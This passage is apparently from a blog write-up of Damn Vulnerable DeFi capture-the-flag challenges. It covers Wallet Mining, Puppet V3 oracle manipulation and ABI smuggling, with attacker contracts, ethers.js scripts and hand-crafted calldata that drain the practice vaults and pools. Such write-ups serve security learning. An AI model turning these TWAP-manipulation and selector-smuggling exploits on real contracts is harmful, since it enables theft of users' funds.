The wallet is also acting as a proxy, and the `initialize` function is called to the proxy contract, but the logic contract is not yet initialized. We can call `initialize` to the logic contract, and become owner of it. Then, by upgrading the contract to an implementation under our control, we can call `selfdestruct` .

Yes, you have heard it right. We need to call `selfdestruct` . This is because, in wallet contract, the `can` function actually calls `proxy.can()` , and checks if the return value is zero. If it is zero, reverts. But what if the function call failed? It will not return zero, and `staticcall` doesn’t check for call failure what-so-ever. This means we can bypass the check this way. But you may also wonder, the wallet is making a function call to the proxy contract, and we only can `selfdestruct` logic contract, how would this affect the proxy contract?

The proxy contracts actually doesn’t do anything, all it does is to store state variables, and when functions are called, it uses delegatecall to call functions in the logic contract. The delegatecall changes the state in the context of proxy contracts, not logic contracts. When the logic contract is gone, the delegatecall will also fail, hence the exploit logic above.

1. Transfer some ethers to `Deployer3` to make the nonce become 1.
2. Send raw transaction to create masterCopy contract in our network.
3. Do the same for factory contract.
4. Deploy a proxy contract using factory contract, and transfer all the tokens to us.
5. Initialize logic contract of `authorizer` contract, and upgrade to a new implementation which can be self-destructed.
6. Call `wallet.drop` over and over again to drain all tokens of the wallet.

### Solution

I didn’t fully complete this level, I high recommend readers refer to [https://systemweakness.com/damn-vulnerable-defi-v3-13-wallet-mining-solution-d5147533fa49?gi=d8d742ab62b0](https://systemweakness.com/damn-vulnerable-defi-v3-13-wallet-mining-solution-d5147533fa49?gi=d8d742ab62b0) and [https://www.youtube.com/watch?v=7PS-wuIsZ4A](https://www.youtube.com/watch?v=7PS-wuIsZ4A) for more detailed walkthrough.

## Challenge #14 - Puppet V3

### Prompt

Even on a bear market, the devs behind [the lending pool](https://damnvulnerabledefi.xyz/challenges/puppet-v2/) kept building.

In the latest version, they’re using Uniswap V3 as an oracle. That’s right, no longer using spot prices! This time the pool queries the time-weighted average price of the asset, with all the recommended libraries.

The Uniswap market has 100 WETH and 100 DVT in liquidity. The lending pool has a million DVT tokens.

Starting with 1 ETH and some DVT, pass this challenge by taking all tokens from the lending pool.

*NOTE: unlike others, this challenge requires you to set a valid RPC URL in the challenge’s test file to fork mainnet state into your local environment.*

### Contracts & Key Functions

```solidity
contract PuppetV3Pool
```

- `_getOracleQuote` now quotes the UniswapV3 Pool for TWAP price.

### Analysis

The large scale logic didn’t change much compare to the Puppet and Puppet-V2 challenge. But this time, it’s using UniswapV3 and a TWAP average for price fetching. TWAP stands for Time Weighted Average Price I assume. It measures the average of the price within a period of time, makes price manipulating way harder and even impossible.

That being said, TWAP is safe when the duration is long enough. Apparently, in this challenge, the duration is set to 10 minutes, which is pretty risky to say the least.

Again, we can swap all of our tokens to WETH to make token’s price drop. Then we need to wait for some time, when the TWAP is low enough for us to borrow some tokens or even all tokens from the pool with way lower prices.

The challenge limits us from elapsing only 115 seconds, but it’s more than enough to make the attack successful.

1. Swap all tokens for WETH in the UniswapV3 pool.
2. Speed up time for around 110 seconds to make the TWAP drop.
3. Borrow all of tokens of the pool with low price.

### Solution

I used a contract to help me, and actually, you have to use a contract as UniswapV3 does a callback on `receiver`

```javascript
// token0: WETH
// token1: DVD
function doSwap(int256 amount) external {
    (uint160 sqrtPrice, , , , , , ) = pool.slot0();
    console.log(sqrtPrice, TickMath.MAX_SQRT_RATIO - 1);
    pool.swap(
        address(this),
        false,
        amount,
        TickMath.MAX_SQRT_RATIO - 1,
        ""
    );
}

function borrow(uint256 amount) external {
    uint256 _amount = lender.calculateDepositOfWETHRequired(amount);
    console.log("deposit required:", _amount);
    console.log("current weth balance:", IERC20(token0).balanceOf(address(this)));
    IERC20(token0).approve(address(lender), _amount);
    console.log("token1 balance before:", IERC20(token1).balanceOf(address(this)));
    lender.borrow(amount);
    console.log("token1 balance after:", IERC20(token1).balanceOf(address(this)));
}

function withdraw(address player) external {
    IERC20(token1).transfer(player, IERC20(token1).balanceOf(address(this)));
}

function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata
) external override {
    console.log("callback function called");
    if (amount0Delta < 0) {
        console.log("received weth", uint256(-amount0Delta));
    } else {
        IERC20(token0).transfer(address(pool), uint256(amount0Delta));
    }

    if (amount1Delta < 0) {
        console.log("received dvt", uint256(-amount1Delta));
    } else {
        IERC20(token1).transfer(address(pool), uint256(amount1Delta));
    }

}
```

With ethers.js:

```javascript
attacker = await (await ethers.getContractFactory('PuppetV3Attacker', deployer)).deploy(lendingPool.address);
await player.sendTransaction(
    {
        value: ethers.utils.parseEther('0.95'),
        to: attacker.address
    }
);

await token.transfer(attacker.address, await token.balanceOf(player.address));

await attacker.doSwap(ethers.utils.parseEther('110'));
await time.increase(108);
await attacker.borrow(ethers.utils.parseEther('1000000'));
await attacker.withdraw(player.address);
```

## Challenge #15 - ABI Smuggling

### Prompt

There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.

The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.

The dev team has received a responsible disclosure saying all funds can be stolen.

Before it’s too late, rescue all funds from the vault, transferring them back to the recovery account.

### Contracts & Key Functions

```solidity
abstract contract AuthorizedExecutor is ReentrancyGuard
```

- `execute` executes input bytes as data in low-level, but checks if the function `msg.sender` is allowed to call.
- `setPermissions` sets the function selector which the specific address can call in `execute`

```solidity
contract SelfAuthorizedVault is AuthorizedExecutor
```

- `sweepFunds` does exactly what you think. But can only be called by `address(this)`

### Analysis

During deployment, we are authorized to call `withdraw` , but this is not enough to drain all funds. As the name suggests, we need to learn a bit about ABI and does some tricky stuff with it.

In short, when handling dynamic types like `bytes calldata` , ABI uses the pointer-length-value encoding, for example, in the `execute` function:

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    // Read the 4-bytes selector at the beginning of `actionData`
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
    assembly {
        selector := calldataload(calldataOffset)
    }

    if (!permissions[getActionId(selector, msg.sender, target)]) {
        revert NotAllowed();
    }

    _beforeFunctionCall(target, actionData);

    return target.functionCall(actionData);
}
```

There are two parameters, and the ABI to call this function will have format of this:

```solidity
|selector(4 bytes)|address(32 bytes)|bytes.pointer(32 bytes)|bytes.length(32 bytes)|bytes.data|
```

Hence the `calldataOffset` calculated by the function. But, what if we inject the selector of function which we are allowed to call, wouldn’t the function thinks we are calling the permitted function?

And that was the attack idea, not too easy to understand, and also not easy to pull off.

### Solution

I will drop the solution here, because this one is kind hard to explain well. I strongly recommend readers to read [https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a#4cdc](https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a#4cdc)

```javascript
helper = await (await ethers.getContractFactory('AbiSmugglingHelper', deployer)).deploy(vault.address, token.address)
calldata = await helper.help(recovery.address);
// execute selector:
// 0x1cff79cd
// withdraw selector:
// 0xd9caed12
// sweepFund data:
// 0x97c540ba00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
// |selector(4)|address(32)|bytes.pointer(32)|bytes.length(32)|bytes.data...|
//                                                                 |-> selector(withdraw)|
// bytes pointer -> 0x80
// bytes length -> 0x88
console.log(player.address, token.address);
rawData = '0x1cff79cd' +
        ethers.utils.hexZeroPad(vault.address, 32).substr(2) +  // 0x00 - 0x20
        ethers.utils.hexZeroPad('0x64', 32).substr(2) +  // 0x20 - 0x40
        ethers.utils.hexZeroPad('0x00', 32).substr(2) +  // 0x40 - 0x60
        ethers.utils.hexZeroPad('0xd9caed12', 4).substr(2) +
        ethers.utils.hexZeroPad('0x44', 32).substr(2) +  // 0x60 - 0x80
        calldata.substr(2)

await player.sendTransaction({to: vault.address, data: rawData, gasLimit: 3000000n});
```

## Conclusion

I feel like I could’ve done better doing this write-up, but meh. Readers are also welcomed to ask question regarding the challenges @brandon_shi on Twitter, or X shall I say.
{% endraw %}
